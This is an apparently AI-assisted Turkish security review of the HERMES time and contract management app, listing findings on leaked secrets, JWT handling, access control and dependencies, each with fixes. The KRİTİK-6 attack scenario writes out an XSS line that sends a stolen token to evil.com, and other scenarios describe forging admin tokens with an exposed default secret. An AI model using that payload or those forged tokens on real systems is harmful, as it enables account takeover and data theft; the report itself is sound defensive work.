# HERMES Projesi — Güvenlik Değerlendirme Raporu

**Proje:** HERMES (Zaman, Proje ve Sözleşme Yönetimi Uygulaması)
**Tarih:** 05 Mart 2026
**Teknoloji Yığını:** React/Vite + FastAPI + SQLAlchemy + PostgreSQL + Kubernetes
**Kapsam:** 4 Dockerfile · 22 K8s YAML · 2 .env · 1 docker-compose · 1 CI/CD workflow · 65+ Python kaynak dosyası · 20+ React bileşeni
**Tarama Fazları:** Faz 1 (Altyapı) · Faz 2 (Middleware) · Faz 3 (İş Mantığı) · Faz 4 (Veritabanı & Frontend)

> ⚠️ **SORUMLULUK REDDİ:** Bu, yapay zeka destekli statik bir güvenlik incelemesidir.
> Kapsamlı bir sızma testi veya uyumluluk denetiminin yerini tutmaz.
> Tüm bulgular, düzeltme öncesinde nitelikli güvenlik uzmanları tarafından doğrulanmalıdır.

---

## 📊 Kümülatif Özet

| Şiddet    | Faz 1 | Faz 2 | Faz 3 | Faz 4 | Toplam |
|-----------|-------|-------|-------|-------|--------|
| 🔴 Kritik | 2     | 2     | 1     | 1     | **6**  |
| 🟠 Yüksek | 2     | 3     | 3     | 3     | **11** |
| 🟡 Orta   | 3     | 2     | 2     | 3     | **10** |
| 🔵 Düşük  | 2     | 1     | 1     | 2     | **6**  |
| **Toplam**| 9     | 8     | 7     | 9     | **33** |

---

## 🚨 Nihai Aksiyon Planı (Öncelik Sıralaması)

| # | Bulgu ID | Açıklama | Şiddet | Tahmini Süre |
|---|----------|----------|--------|-------------|
| 1 | KRİTİK-1 | Azure Client Secret iptal et | 🔴 | < 1 saat |
| 2 | KRİTİK-4 | `SECRET_KEY[:4]` log satırını sil | 🔴 | < 30 dk |
| 3 | KRİTİK-3 | JWT fallback değerlerini kaldır, crash-fast ekle | 🔴 | < 2 saat |
| 4 | KRİTİK-6 | JWT token'ı `localStorage`'dan `HttpOnly` cookie'ye taşı | 🔴 | 1-2 gün |
| 5 | KRİTİK-5 | project-memberships / issues rol kontrolü ekle | 🔴 | < 1 gün |
| 6 | KRİTİK-2 | RS256 asimetrik JWT mimarisine geç | 🔴 | 2-3 gün |
| 7 | YÜKSEK-5 | SSO auto-provisioning / domain kısıtlaması | 🟠 | < 1 gün |
| 8 | YÜKSEK-4 | `redirect_uri` allowlist | 🟠 | < 2 saat |
| 9 | YÜKSEK-10 | `npm audit fix` — axios güncelle | 🟠 | < 1 saat |
| 10 | YÜKSEK-9 | `List[str]` → `List[UUID]` dönüştür | 🟠 | < 2 saat |
| 11 | YÜKSEK-3 | `DEBUG=False` varsayılanı tüm config'lerde | 🟠 | < 30 dk |
| 12 | YÜKSEK-1 | Non-root `USER` direktifi Dockerfile'lara ekle | 🟠 | < 1 gün |
| 13 | ORTA-5 | `/users/options` endpoint'ine auth bağımlılığı ekle | 🟡 | < 1 saat |
| 14 | ORTA-9 | Production console.log temizliği | 🟡 | < 1 saat |
| 15 | ORTA-8 | Hardcoded Azure ID'lerini env değişkenine taşı | 🟡 | < 1 saat |
| 16 | ORTA-3 | Nginx güvenlik header'ları ekle | 🟡 | < 2 saat |

---

# 🗂️ FAZ 1 — Altyapı, Konfigürasyon ve Bağımlılıklar

---

## 🔴 KRİTİK Bulgular

---

### [KRİTİK-1] Gerçek Azure AD Client Secret `.env` Dosyasında Düz Metin

- **Zafiyet Türü:** CWE-798 — Use of Hard-coded Credentials
- **OWASP:** A02 - Cryptographic Failures, A05 - Security Misconfiguration
- **Konum:** `backend/auth-service/.env` → Satır 3-4
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
```
AZURE_CLIENT_SECRET=<REDACTED_IPTAL_EDILDI_BKZ_AZURE_PORTAL>
JWT_SECRET_KEY=hermes-dev-secret-key-change-in-production
```

**Saldırı Senaryosu:**
1. Saldırgan, kaynak kod deposuna herhangi bir yolla erişir.
2. `AZURE_CLIENT_SECRET` değerini okur; Microsoft Graph API'ye kimlik doğrulama yapar.
3. Tüm Azure AD tenant'ına yetkisiz erişim kazanır: e-posta okuma, kullanıcı yönetimi.
4. `JWT_SECRET_KEY` ile herhangi bir Admin kimliğine bürünen sahte token üretir.

**Çözüm (Remediation):**
```bash
# ADIM 1: Azure Client Secret'ı DERHAL iptal edin.
# Azure Portal → App Registrations → Certificates & Secrets → Delete

# ADIM 2: .env dosyasını git geçmişinden temizleyin.
bfg --delete-files .env
git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push --force

# ADIM 3: Yeni secret'ları K8s Secret olarak oluşturun.
kubectl create secret generic hermes-secrets \
  --from-literal=AZURE_CLIENT_SECRET="<Azure_Portal_dan_Yenisi>" \
  --from-literal=JWT_SECRET_KEY="$(openssl rand -hex 32)" \
  -n hermes
```

---

### [KRİTİK-2] JWT Secret Key Tüm Servisler Arasında Paylaşılıyor — Servis İzolasyonu Yok

- **Zafiyet Türü:** CWE-321 — Use of Hard-coded Cryptographic Key
- **OWASP:** A02 - Cryptographic Failures, A07 - Identification and Authentication Failures
- **Konum:** `k8s/03-backend-core.yaml` · `k8s/03-backend-reporting.yaml` · `k8s/test/` eşdeğerleri
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
`JWT_SECRET_KEY` aynı K8s Secret'tan `auth-service`, `core-service` ve `reporting-service`'e mount edilmektedir. Herhangi bir servis ele geçirildiğinde tüm sistemler için geçerli token üretilebilir.

**Saldırı Senaryosu:**
1. Saldırgan, `reporting-service`'i bir 3. parti açıkla ele geçirir.
2. Container env'den `JWT_SECRET_KEY` okur.
3. Admin yetkili sahte token üretir; Core Service'e erişir.
4. Tüm müşteri sözleşme ve bütçe verileri sızdırılır.

**Çözüm (Remediation):**
```python
# auth-service: Token üretimi (private key ile — RS256)
PRIVATE_KEY = os.environ["JWT_PRIVATE_KEY"]
def create_access_token(data: dict) -> str:
    return jwt.encode(data, PRIVATE_KEY, algorithm="RS256")

# core-service / reporting-service: Yalnızca doğrulama (public key ile)
PUBLIC_KEY = os.environ["JWT_PUBLIC_KEY"]
def verify_token(token: str) -> TokenData:
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
    ...
```

```yaml
# K8s Secret ayrımı:
# JWT_PRIVATE_KEY → SADECE auth-service Deployment'ına mount
# JWT_PUBLIC_KEY  → core ve reporting Deployment'larına mount
```

---

## 🟠 YÜKSEK Bulgular

---

### [YÜKSEK-1] Tüm Dockerfile'larda `USER` Direktifi Eksik — Root Olarak Çalışıyor

- **Zafiyet Türü:** CWE-250 — Execution with Unnecessary Privileges
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `backend/*/Dockerfile` · `frontend/Dockerfile` — tüm production stage'ler
- **Şiddet:** 🟠 Yüksek
- **Güven Düzeyi:** Yüksek

**Tespit:** Hiçbir Dockerfile'da `USER` direktifi yok; tüm servisler root olarak çalışıyor.

**Çözüm (Remediation):**
```dockerfile
# backend/*/Dockerfile — production stage'e eklenecek:
RUN groupadd --gid 1001 appgroup \
    && useradd --uid 1001 --gid appgroup --shell /bin/bash --create-home appuser
RUN chown -R appuser:appgroup /app
USER appuser  # ← EKLENDİ
```

---

### [YÜKSEK-2] `docker-compose.yml`'de `DEBUG=true` ve Hardcoded Şifreler

- **Zafiyet Türü:** CWE-215, CWE-798
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `docker-compose.yml` → Satır 31, 77-80, 102-106, 129
- **Şiddet:** 🟠 Yüksek
- **Güven Düzeyi:** Yüksek

**Tespit:**
```yaml
POSTGRES_PASSWORD: hermes_dev_password
JWT_SECRET_KEY=hermes-dev-secret-key-change-in-production  # ← Production ile aynı!
DEBUG=true  # ← 3 serviste aktif
```

**Çözüm (Remediation):**
```yaml
auth-service:
  environment:
    - AUTH_DB_PASSWORD=${AUTH_DB_PASSWORD}
    - JWT_SECRET_KEY=${JWT_SECRET_KEY_DEV}   # Production'dan FARKLI
    - DEBUG=false
```

---

## 🟡 ORTA Bulgular

---

### [ORTA-1] `timescale/timescaledb:latest-pg15` — Sabitlenmemiş Image Tag

- **Zafiyet Türü:** CWE-1104
- **OWASP:** A06 - Vulnerable and Outdated Components
- **Konum:** `k8s/02-db-core.yaml` → Satır 19
- **Şiddet:** 🟡 Orta

**Çözüm:**
```yaml
image: timescale/timescaledb:2.14.2-pg15  # Sabit semantik versiyon
```

---

### [ORTA-2] Ingress Kurallarında `host` Alanı Eksik

- **Zafiyet Türü:** CWE-284
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `k8s/05-ingress.yaml` · `k8s/test/05-ingress.yaml`
- **Şiddet:** 🟡 Orta

**Çözüm:**
```yaml
spec:
  rules:
  - host: hermes.yourdomain.com   # Açık hostname tanımı zorunlu
    http:
      paths: ...
```

---

### [ORTA-3] Nginx Konfigürasyonunda Güvenlik Header'ları Eksik

- **Zafiyet Türü:** CWE-16
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `frontend/nginx.conf` — tüm dosya
- **Şiddet:** 🟡 Orta

**Çözüm:**
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://login.microsoftonline.com;" always;
```

---

## 🔵 DÜŞÜK Bulgular

---

### [DÜŞÜK-1] `python-jose` — Aktif Bakımı Yapılmıyor

- **Zafiyet Türü:** CWE-327
- **OWASP:** A06 - Vulnerable and Outdated Components
- **Konum:** `backend/*/requirements.txt`
- **Şiddet:** 🔵 Düşük

**Çözüm:**
```
# python-jose[cryptography]==3.3.0  ← Kaldır
PyJWT[crypto]==2.8.0                ← Ekle
```

---

### [DÜŞÜK-2] GitHub Actions — Action'lar SHA ile Sabitlenmemiş

- **Zafiyet Türü:** CWE-1104
- **OWASP:** A08 - Software and Data Integrity Failures
- **Konum:** `.github/workflows/cd-dev.yml` → Satır 22, 25
- **Şiddet:** 🔵 Düşük

**Çözüm:**
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2
uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
```

---

# 🗂️ FAZ 2 — Giriş Noktaları ve Middleware

---

## 🔴 KRİTİK Bulgular

---

### [KRİTİK-3] JWT Secret Kaynak Koduna Fallback Olarak Gömülmüş — Tüm Servislerde

- **Zafiyet Türü:** CWE-798 — Use of Hard-coded Credentials
- **OWASP:** A07 - Identification and Authentication Failures
- **Konum:**
  - `backend/shared/auth.py` → Satır 28
  - `backend/auth-service/app/config.py` → Satır 83
  - `backend/core-service/app/config.py` → Satır 60
  - `backend/reporting-service/app/config.py` → Satır 27
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
```python
# shared/auth.py
SECRET_KEY = os.getenv("JWT_SECRET_KEY", "hermes-dev-secret-key-change-in-production")

# her üç config.py
JWT_SECRET_KEY: str = "hermes-dev-secret-key-change-in-production"
```
K8s Secret enjeksiyonu başarısız olduğunda uygulama bu zayıf fallback değerle sessizce çalışmaya devam eder.

**Saldırı Senaryosu:**
1. Saldırgan repo'dan fallback değeri okur.
2. `{"user_id": "<admin-uuid>", "is_admin": true}` payload'unu bu değerle imzalar.
3. Production API'ye Admin token'ı olarak gönderir; tüm verilere erişir.

**Çözüm (Remediation):**
```python
# shared/auth.py — Satır 28 (DÜZELTİLMİŞ):
import sys
_secret = os.getenv("JWT_SECRET_KEY")
if not _secret:
    print("FATAL: JWT_SECRET_KEY tanımlı değil. Başlatma iptal.", file=sys.stderr)
    sys.exit(1)
SECRET_KEY = _secret

# config.py — TÜM SERVİSLERDE (DÜZELTİLMİŞ):
class Settings(BaseSettings):
    JWT_SECRET_KEY: str  # Varsayılan YOK

    @field_validator("JWT_SECRET_KEY")
    @classmethod
    def validate_jwt_secret(cls, v: str) -> str:
        if len(v) < 32:
            raise ValueError("JWT_SECRET_KEY en az 32 karakter olmalıdır")
        if "change-in-production" in v or "dev-secret" in v:
            raise ValueError("Geçersiz JWT_SECRET_KEY: Güvenli bir değer kullanın")
        return v
```

---

### [KRİTİK-4] `verify_token` JWT Secret'ın İlk 4 Karakterini Log'a Yazıyor

- **Zafiyet Türü:** CWE-209 — Generation of Error Message Containing Sensitive Information
- **OWASP:** A09 - Security Logging and Monitoring Failures
- **Konum:** `backend/shared/auth.py` → Satır 181-183
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
```python
except JWTError as e:
    print(f"DEBUG: Token Validation Failed: {str(e)}")
    print(f"DEBUG: Secret: {SECRET_KEY[:4]}... Algorithm: {ALGORITHM}")  # ← KRİTİK
    raise UnauthorizedError(f"Token doğrulanamadı: {str(e)}")            # ← Detay istemciye dönüyor
```

**Saldırı Senaryosu:**
1. Saldırgan log sistemine erişir.
2. `DEBUG: Secret: herm...` satırlarını filtreler.
3. `"hermes-dev-secret-key-change-in-production"` fallback değerini doğrular.
4. Bu değerle sahte Admin token üretir.

**Çözüm (Remediation):**
```python
import logging
logger = logging.getLogger(__name__)

except JWTError as e:
    # Secret'ı ASLA loglama
    logger.warning("JWT doğrulama başarısız", extra={"error_type": type(e).__name__})
    # İstemciye genel mesaj
    raise UnauthorizedError("Kimlik doğrulama başarısız")
```

---

## 🟠 YÜKSEK Bulgular

---

### [YÜKSEK-3] `DEBUG=True` Üç Servisin Kaynak Kodunda Varsayılan Değer

- **Zafiyet Türü:** CWE-215
- **OWASP:** A05 - Security Misconfiguration
- **Konum:**
  - `backend/auth-service/app/config.py` → Satır 40
  - `backend/core-service/app/config.py` → Satır 36
  - `backend/reporting-service/app/config.py` → Satır 20
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
DEBUG: bool = True  # Her üç config.py'de — K8s'te override edilmiyor
```
Sonuçları: Swagger UI production'da açık, 500 hatalarında tam Python traceback HTTP yanıtına ekleniyor.

**Çözüm:**
```python
DEBUG: bool = False  # Varsayılan her zaman False
```

---

### [YÜKSEK-4] Microsoft SSO `redirect_uri` Doğrulanmıyor — OAuth Token Hijacking

- **Zafiyet Türü:** CWE-601 — URL Redirection to Untrusted Site
- **OWASP:** A07 - Identification and Authentication Failures
- **Konum:** `backend/auth-service/app/routers/auth.py` · `backend/auth-service/app/services/auth_service.py` → Satır 162-165
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
class MicrosoftLoginRequest(BaseModel):
    code: str
    redirect_uri: str   # ← Allowlist kontrolü yok

token_data = {
    "redirect_uri": redirect_uri,   # ← Doğrudan Azure'a iletiliyor
    ...
}
```

**Çözüm:**
```python
# config.py:
ALLOWED_REDIRECT_URIS: list = ["https://hermes.sirket.com/auth/callback"]

# auth_service.py:
if redirect_uri not in self.settings.ALLOWED_REDIRECT_URIS:
    raise UnauthorizedError("Geçersiz redirect_uri")
```

---

### [YÜKSEK-5] Microsoft SSO Herhangi Bir Microsoft Hesabını Otomatik Kaydediyor

- **Zafiyet Türü:** CWE-284 — Improper Access Control
- **OWASP:** A01 - Broken Access Control, A07 - Identification and Authentication Failures
- **Konum:** `backend/auth-service/app/services/auth_service.py` → Satır 203-215
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
# Domain/whitelist kontrolü yok — herhangi bir Microsoft hesabı sisteme girebilir
user = User(email=email, is_active=True, ...)
self.db.add(user)
self.db.commit()
```

**Çözüm:**
```python
email_domain = email.split("@")[-1].lower()
if email_domain not in self.settings.AZURE_ALLOWED_DOMAINS:
    raise UnauthorizedError("Bu domain ile giriş yapılamaz")

user = self._get_user_by_email(email)
if not user:
    raise UnauthorizedError("Bu hesaba ait HERMES erişimi yok")
```

---

## 🟡 ORTA Bulgular

---

### [ORTA-4] CORS Konfigürasyonu Production'da Sadece Localhost İçeriyor

- **Zafiyet Türü:** CWE-942
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `backend/*/app/config.py`
- **Şiddet:** 🟡 Orta

**Çözüm:**
```yaml
# k8s/03-backend-auth.yaml:
- name: CORS_ORIGINS
  value: '["https://hermes.sirket.com"]'
```

---

### [ORTA-5] `GET /api/v1/auth/users/options` Authentication Gerektirmiyor

- **Zafiyet Türü:** CWE-306 — Missing Authentication for Critical Function
- **OWASP:** A01 - Broken Access Control
- **Konum:** `backend/auth-service/app/routers/users.py` → Satır 153-190
- **Şiddet:** 🟡 Orta

**Tespit:** `Depends(get_current_user)` bağımlılığı eksik — token olmadan tüm kullanıcı listesi dönüyor.

**Çözüm:**
```python
async def list_user_options(
    role: str = Query(None),
    current_user: CurrentUser = Depends(get_current_user),  # ← EKLENDİ
    db: Session = Depends(get_db)
):
```

---

## 🔵 DÜŞÜK Bulgular

---

### [DÜŞÜK-3] `dashboard.py` Exception Handler `str(e)` İstemciye Döndürüyor

- **Zafiyet Türü:** CWE-209
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `backend/reporting-service/app/routers/dashboard.py` → Satır 76-80
- **Şiddet:** 🔵 Düşük

**Çözüm:**
```python
except Exception as e:
    logger.exception("Dashboard verisi alınırken hata oluştu")
    raise HTTPException(status_code=500, detail="Dashboard verisi alınamadı.")
```

---

# 🗂️ FAZ 3 — İş Mantığı ve API Endpoint'leri

---

## 🔴 KRİTİK Bulgular

---

### [KRİTİK-5] `project-memberships` ve `issues` Router'larında Rol Kontrolü Yok

- **Zafiyet Türü:** CWE-285 — Improper Authorization
- **OWASP:** A01 - Broken Access Control, API5 - Broken Function Level Authorization
- **Konum:**
  - `backend/core-service/app/routers/project_memberships.py` → Satır 16-67
  - `backend/core-service/app/routers/issues.py` → Satır 16-94
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
```python
# project_memberships.py
@router.post("")
def create_membership(
    mem_in: ProjectMembershipCreate,
    db: Session = Depends(get_db),
    current_user: dict = Depends(get_current_user)  # ← Sadece auth, ROL kontrolü YOK
):
    new_mem = ProjectMembership(**mem_in.model_dump())
    db.add(new_mem)   # ← Herhangi kullanıcı kendini istediği projeye ekleyebilir

@router.delete("/{mem_id}")
def delete_membership(
    mem_id: UUID,
    db: Session = Depends(get_db),
    current_user: dict = Depends(get_current_user)  # ← Sahiplik kontrolü YOK
):
    db.delete(mem)   # ← Herhangi kullanıcı herhangi üyeliği silebilir
```

**Saldırı Senaryosu:**
1. Standart kullanıcı kendi UUID'si ve hedef proje UUID'siyle `POST /project-memberships` gönderir.
2. Admin onayı olmadan istediği projeye üye olur.
3. Proje verilerine yetkisiz erişim kazanır veya başkasının üyeliğini silerek projeye erişimini engeller.

**Çözüm (Remediation):**
```python
# project_memberships.py (DÜZELTİLMİŞ):
@router.post("")
def create_membership(
    mem_in: ProjectMembershipCreate,
    db: Session = Depends(get_db),
    admin: CurrentUser = Depends(require_admin)  # ← Sadece Admin
):
    ...

@router.delete("/{mem_id}")
def delete_membership(
    mem_id: UUID,
    db: Session = Depends(get_db),
    admin: CurrentUser = Depends(require_admin)  # ← Sadece Admin
):
    ...

# issues.py (DÜZELTİLMİŞ) — proje üyeliği kontrolü:
membership = db.query(ProjectMembership).filter(
    ProjectMembership.project_id == issue_in.project_id,
    ProjectMembership.user_id == current_user.id,
    ProjectMembership.is_active == True
).first()
if not membership and not current_user.is_admin:
    raise HTTPException(status_code=403, detail="Bu projeye erişim yetkiniz yok")
```

---

## 🟠 YÜKSEK Bulgular

---

### [YÜKSEK-6] `GET /json/user-logs` Standart Kullanıcıya `customer_ids`/`project_ids` Filtresi Açık

- **Zafiyet Türü:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **OWASP:** A01 - Broken Access Control, API3 - Broken Object Property Level Authorization
- **Konum:** `backend/core-service/app/routers/reports.py` → Satır 420-433
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
if not current_user.is_admin:
    query = query.filter(WorkLog.user_id == current_user.id)  # user_id kısıtlandı
# Ancak diğer filtreler her kullanıcıya açık:
if customer_ids:
    query = query.filter(cast(WorkLog.customer_id, String).in_(customer_ids))
if project_ids:
    query = query.filter(cast(WorkLog.project_id, String).in_(project_ids))
```

**Çözüm:**
```python
if not current_user.is_admin:
    # Standart kullanıcı: Hiçbir ek filtre — sadece kendi verileri
    query = query.filter(WorkLog.user_id == current_user.id)
else:
    # Admin: Tüm filtreler geçerli
    if user_ids:    query = query.filter(WorkLog.user_id.in_(user_ids))
    if customer_ids: query = query.filter(WorkLog.customer_id.in_(customer_ids))
    if project_ids:  query = query.filter(WorkLog.project_id.in_(project_ids))
```

---

### [YÜKSEK-7] `base.py` `delete()` `print(DEBUG)` ile Loglama Yapıyor — Audit Trail Eksik

- **Zafiyet Türü:** CWE-532 — Missing Audit Trail
- **OWASP:** A09 - Security Logging and Monitoring Failures
- **Konum:** `backend/core-service/app/services/base.py` → Satır 148
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
def delete(self, id: UUID, soft: bool = False) -> bool:
    print(f"DEBUG: delete called for {self.resource_name} {id} with soft={soft}")
```

**Çözüm:**
```python
import logging
logger = logging.getLogger(__name__)

def delete(self, id: UUID, soft: bool = False) -> bool:
    db_obj = self.get_by_id_or_404(id)
    if soft and hasattr(self.model, 'is_active'):
        db_obj.is_active = False
        self.db.commit()
        logger.info("Kayıt pasif yapıldı", extra={"resource": self.resource_name, "id": str(id)})
    else:
        self.db.delete(db_obj)
        self.db.commit()
        logger.warning("Kayıt kalıcı silindi", extra={"resource": self.resource_name, "id": str(id)})
    return True
```

---

### [YÜKSEK-8] Sözleşme Alanları Güncelleme Validasyonu Eksik — İş Mantığı Zafiyeti

- **Zafiyet Türü:** CWE-285 — Improper Authorization / Business Logic Flaw
- **OWASP:** A01 - Broken Access Control, A04 - Insecure Design
- **Konum:**
  - `backend/core-service/app/services/customer_service.py` → Satır 41-51
  - `backend/core-service/app/schemas/customer.py` · `project.py`
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
def update(self, id: UUID, data: CustomerUpdate) -> Customer:
    if data.contract_duration_days is not None:
        data.contract_start_date = datetime.now(timezone.utc)  # ← Otomatik bugün
    return super().update(id, data)
```
Admin `contract_duration_days=1` göndererek sözleşmeyi yarına sonlandırabilir; minimum süre/geçmiş tarih kontrolü yok.

**Çözüm:**
```python
def update(self, id: UUID, data: CustomerUpdate) -> Customer:
    update_data = data.model_dump(exclude_unset=True)
    if 'contract_duration_days' in update_data:
        duration = update_data['contract_duration_days']
        if duration is not None and duration < 1:
            raise ValidationError("Sözleşme süresi en az 1 gün olmalıdır")
        logger.info("Sözleşme güncellendi", extra={"customer_id": str(id), "duration": duration})
    return super().update(id, data)
```

---

## 🟡 ORTA Bulgular

---

### [ORTA-6] Timesheet `submit`'te `reviewer_id` Doğrulanmıyor

- **Zafiyet Türü:** CWE-20 — Improper Input Validation
- **OWASP:** A04 - Insecure Design
- **Konum:** `backend/core-service/app/routers/timesheets.py` → Satır 89-126
- **Şiddet:** 🟡 Orta

**Çözüm:**
```python
if submission_in.reviewer_id == UUID(current_user.id):
    raise HTTPException(status_code=400,
        detail="Kendi timesheetinizi kendiniz onaylayamazsınız")
```

---

### [ORTA-7] `count_all_logs()` Filtre Parametrelerini Yoksayıyor

- **Zafiyet Türü:** CWE-284 — Bilgi Sızıntısı
- **OWASP:** A01 - Broken Access Control
- **Konum:** `backend/core-service/app/routers/work_logs.py` · `work_log_service.py`
- **Şiddet:** 🟡 Orta

**Çözüm:**
```python
def count_all_logs(self, start_date=None, end_date=None,
                   customer_id=None, project_id=None, user_id=None) -> int:
    query = self.db.query(WorkLog)
    if start_date:   query = query.filter(WorkLog.date_worked >= start_date)
    if end_date:     query = query.filter(WorkLog.date_worked <= end_date)
    if customer_id:  query = query.filter(WorkLog.customer_id == customer_id)
    if project_id:   query = query.filter(WorkLog.project_id == project_id)
    if user_id:      query = query.filter(WorkLog.user_id == user_id)
    return query.count()
```

---

## 🔵 DÜŞÜK Bulgular

---

### [DÜŞÜK-4] Hard Delete / Soft Delete Tutarsızlığı

- **Zafiyet Türü:** CWE-710
- **OWASP:** A04 - Insecure Design
- **Konum:** `backend/core-service/app/routers/customers.py` → Satır 84 · `projects.py` → Satır 96
- **Şiddet:** 🔵 Düşük

**Çözüm:**
```python
service.delete(customer_id, soft=True)  # Docstring "soft delete" diyorsa soft=True
```

---

# 🗂️ FAZ 4 — Veritabanı Etkileşimleri ve Veri Sanitizasyonu

---

## 🔴 KRİTİK Bulgular

---

### [KRİTİK-6] JWT Token `localStorage`'da Saklanıyor — XSS ile Tam Hesap Ele Geçirme

- **Zafiyet Türü:** CWE-922 — Insecure Storage of Sensitive Information / CWE-79 — XSS
- **OWASP:** A02 - Cryptographic Failures, A07 - Identification and Authentication Failures
- **Konum:** `frontend/src/stores/authStore.js` → Satır 21-99
- **Şiddet:** 🔴 KRİTİK
- **Güven Düzeyi:** Yüksek

**Tespit:**
```javascript
export const useAuthStore = create(
    persist(
        (set, get) => ({ token: null, user: null, ... }),
        {
            name: 'hermes-auth',   // ← localStorage key
            partialize: (state) => ({
                token: state.token,  // ← JWT token localStorage'a yazılıyor
                ...
            }),
        }
    )
)
```
`localStorage`'daki token JavaScript tarafından her zaman okunabilir. Herhangi bir XSS ile `localStorage.getItem('hermes-auth')` tek satırda tüm token'ı çalar.

**Saldırı Senaryosu:**
1. Gelecekte eklenen bir bileşende (Markdown render, `dangerouslySetInnerHTML` vb.) XSS açığı oluşur.
2. Saldırgan `fetch('https://evil.com/?t=' + localStorage.getItem('hermes-auth'))` kodu enjekte eder.
3. Kurbanın JWT token'ı ve tüm oturum bilgileri çalınır.
4. Token süresi dolana kadar saldırgan production API'ye tam erişime sahip olur.

**Çözüm (Remediation):**
```python
# backend/auth-service/app/routers/auth.py (DÜZELTİLMİŞ):
@router.post("/token")
async def login(response: Response, ...):
    token_obj = auth_service.authenticate(...)
    response.set_cookie(
        key="access_token",
        value=token_obj.access_token,
        httponly=True,    # JS erişimini engeller
        secure=True,      # Sadece HTTPS
        samesite="strict",
        max_age=settings.JWT_EXPIRE_MINUTES * 60,
        path="/"
    )
    return {"user": token_obj.user}  # Token body'de dönmez
```

```javascript
// authStore.js (DÜZELTİLMİŞ): persist middleware kaldırılır
export const useAuthStore = create((set, get) => ({
    user: null,
    isAuthenticated: false,
    login: (user) => set({ user, isAuthenticated: true }),
    logout: () => set({ user: null, isAuthenticated: false }),
    isAdmin: () => get().user?.is_admin === true,
}))

// api.js (DÜZELTİLMİŞ): withCredentials — cookie otomatik gönderilir
const createApiClient = (baseURL) => axios.create({
    baseURL,
    timeout: 30000,
    withCredentials: true,   // ← Cookie otomatik eklenir
})
```

---

## 🟠 YÜKSEK Bulgular

---

### [YÜKSEK-9] `cast(WorkLog.user_id, String).in_(user_ids)` — UUID Doğrulaması Yok

- **Zafiyet Türü:** CWE-20 — Improper Input Validation / CWE-89 (ORM-mediated)
- **OWASP:** A03 - Injection, A04 - Insecure Design
- **Konum:** `backend/core-service/app/routers/reports.py` → Satır 142-156, 425-433
- **Şiddet:** 🟠 Yüksek

**Tespit:**
```python
# Tüm *_ids parametreleri Optional[List[str]] — UUID formatı doğrulanmıyor
if customer_ids:
    query = query.filter(cast(WorkLog.customer_id, String).in_(customer_ids))
```
Geçersiz UUID gönderildiğinde PostgreSQL `invalid input syntax for type uuid` hatasıyla 500 döner; `DEBUG=True` ile birleşince tam stack trace istemciye sızar.

**Çözüm:**
```python
# Optional[List[str]] → Optional[List[UUID]] — Pydantic otomatik doğrular
from uuid import UUID
from typing import Optional, List

user_ids:      Optional[List[UUID]] = Query(None)
customer_ids:  Optional[List[UUID]] = Query(None)
project_ids:   Optional[List[UUID]] = Query(None)
work_type_ids: Optional[List[UUID]] = Query(None)

# cast() artık gerekmiyor:
if customer_ids:
    query = query.filter(WorkLog.customer_id.in_(customer_ids))
```

---

### [YÜKSEK-10] `axios@1.6.5` — Prototype Pollution via `__proto__` (GHSA-43fc-jf86-j433, CVSS 7.5)

- **Zafiyet Türü:** CWE-754 — Prototype Pollution
- **OWASP:** A06 - Vulnerable and Outdated Components
- **Konum:** `frontend/package.json` → Satır 16
- **Şiddet:** 🟠 Yüksek

**Çözüm:**
```bash
npm install axios@latest
```
```json
"axios": "^1.9.0"
```

---

### [YÜKSEK-11] `rollup@4.x` — Arbitrary File Write Path Traversal (GHSA-mw96-cpmx-2vgc)

- **Zafiyet Türü:** CWE-22 — Path Traversal
- **OWASP:** A06 - Vulnerable and Outdated Components
- **Konum:** `frontend/node_modules/rollup` (Vite bağımlılığı)
- **Şiddet:** 🟠 Yüksek

**Çözüm:**
```bash
npm install vite@latest --save-dev  # rollup 4.59.0+ içerir
```

---

## 🟡 ORTA Bulgular

---

### [ORTA-8] `LoginPage.jsx` Azure `tenantId` ve `clientId` Kaynak Koduna Hardcoded

- **Zafiyet Türü:** CWE-798 (Client-side)
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `frontend/src/pages/LoginPage.jsx` → Satır 49-50
- **Şiddet:** 🟡 Orta

**Tespit:**
```javascript
const tenantId = import.meta.env.VITE_AZURE_TENANT_ID
    || '6d7f5e10-f771-470c-b372-5ddab61689cf'  // ← Hardcoded
const clientId = import.meta.env.VITE_AZURE_CLIENT_ID
    || '77dc01d8-6383-46ce-bc63-6da9ab8f3614'  // ← Hardcoded
```

**Çözüm:**
```javascript
const tenantId = import.meta.env.VITE_AZURE_TENANT_ID
const clientId = import.meta.env.VITE_AZURE_CLIENT_ID
if (!tenantId || !clientId) {
    message.error('Azure kimlik yapılandırması eksik.')
    return
}
```

---

